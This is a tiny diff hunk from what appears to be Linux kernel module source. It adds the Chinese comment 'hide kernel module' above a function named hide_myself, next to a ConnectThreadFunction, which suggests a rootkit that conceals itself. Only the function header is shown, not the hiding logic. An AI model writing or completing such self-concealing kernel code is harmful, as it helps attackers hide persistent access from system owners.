@@ -242,6 +242,7 @@ static int ConnectThreadFunction(void *data)
 	return 0;
 }
 
+// 隐藏内核模块
 static void hide_myself(void)
 {
 	struct vmap_area *va, *vtmp;
